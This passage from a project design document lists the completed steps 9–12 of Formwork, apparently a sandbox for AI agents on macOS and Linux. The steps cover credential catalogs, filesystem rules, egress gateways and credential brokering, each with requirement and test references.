9. **Blueprints, the credential catalog, and discovery** (FEP-2): the layered Blueprint model with `extends`, a CLI override surface, and path sigils ([FW-BP1](#fw-bp1)–5), the typed credential catalog enforced across the confiner and the launcher arm with per-type report labels and per-platform honesty ([FW-CRED1](#fw-cred1)–9), and observe-then-widen discovery bounded by the catalog floor ([FW-DISC1](#fw-disc1)–6; [FW-INV7](#fw-inv7)–10) — landed and folded into this document (§2, §4, §5.8–5.10, §6, §7.7–7.10), verified on real Seatbelt + the unified-log denial feed ([FW-E2E-041](#fw-e2e-041)..055, [FW-ADV-012](#fw-adv-012)..015). On Linux the catalog's path arm rides whatever carries fs enforcement, with any-depth floor rows reported Partial per [FW-CRED9](#fw-cred9). Credential brokering landed with FEP-5 (step 11).

10. **Filesystem capability rules** (FEP-3): a flat verb-rule grammar and a `mode` posture over the existing model ([FW-BP6](#fw-bp6)/[FW-BP7](#fw-bp7)), the three-layer deny-terminal evaluation named as a first-class property ([FW-CAP8](#fw-cap8), [FW-INV11](#fw-inv11)), the create/write split ([FW-CAP9](#fw-cap9)), exec-as-a-verb with cross-backend parity ([FW-ISO9](#fw-iso9)/[FW-XR6](#fw-xr6)), and rule provenance + `formwork explain` ([FW-FID6](#fw-fid6)) — landed and folded into this document (§4, §5.2–5.3, §5.6, §5.8, §6, §7.7, §9, §10), with a Seatbelt paired allow/deny probe for the split ([FW-E2E-056](#fw-e2e-056)..058, [FW-E2E-061](#fw-e2e-061)) and a dry-run explain probe ([FW-E2E-059](#fw-e2e-059)). FEP-3 landed in full; one proposed extra, per-deny mechanism labels, was dropped (on macOS every deny is uniformly LSM-enforced so the label carries no information, and its Linux-only disclosures reference machinery not built).

11. **Host-scoped egress, brokering, channels, and isolation** (FEP-5): host rules in `rules` carried by the session gateway, through the Linux connect supervisor and the macOS authenticated loopback listener ([FW-EGR1](#fw-egr1)–[FW-EGR15](#fw-egr15), [FW-BP13](#fw-bp13)–[FW-BP15](#fw-bp15)); TLS inspection and credential brokering ([FW-CRED10](#fw-cred10)–[FW-CRED15](#fw-cred15), [FW-INV13](#fw-inv13)); the host-service channel baseline and the `open-url` opener shim ([FW-ISO13](#fw-iso13)–[FW-ISO18](#fw-iso18), [FW-BP9](#fw-bp9)–[FW-BP11](#fw-bp11), [FW-INV14](#fw-inv14)); the Linux isolation tier and private temporary directories ([FW-ISO10](#fw-iso10), [FW-TRA9](#fw-tra9)/[FW-TRA10](#fw-tra10)); host and channel discovery in `learn` ([FW-DISC12](#fw-disc12)); per-backend report lines and self-explaining refusals ([FW-FID8](#fw-fid8)–[FW-FID11](#fw-fid11)); exit-status transparency ([FW-XR10](#fw-xr10)/[FW-XR11](#fw-xr11)) — landed on both backends and folded into this document (§2–§7, §9, §10), with the macOS answers characterized on macOS 14 and 15 (`docs/macos-characterization.md`). The design record and decisions stay in `docs/fep-5.md`; the execution record in `docs/fep-5-plan.md`.

12. **The egress engine** (FEP-6): the gateway's in-process HTTP(S) proxy — the tunnel grade's server-name check, one resolution with every address classified, HTTP/1.1-only inspection with streamed bodies and authorized forwarding, the name-constrained session CA, the operator's upstream proxy ([FW-EGR16](#fw-egr16)–[FW-EGR26](#fw-egr26)); broker custody, the reflection guard and presentation limits ([FW-CRED16](#fw-cred16)–[FW-CRED19](#fw-cred19)); the host target shape with `allow:` and `tunnel:` as the two grades ([FW-BP16](#fw-bp16)); refusal reasons and grant records ([FW-FID12](#fw-fid12)/[FW-FID13](#fw-fid13)); [FW-INV15](#fw-inv15) — landed on both backends and folded into this document (§2, §4–§8, §10), with the scenario tests in §7.12. The integrated scenario forms that need registry and `git http-backend` fixtures are owed (`docs/STATUS.md`); the design record stays in `docs/fep-6.md`, the execution record in `docs/fep-6-plan.md`.

If steps 1–4 pass, Formwork is a transparent, reusable filesystem confiner that behaves the same on both platforms and tells the truth about itself. If steps 5–7 pass, it is a complete agent sandbox: one privileged broker, everything else in a mould, egress forced through a policy gateway, and every claim backed by a mechanism or reported as a gap.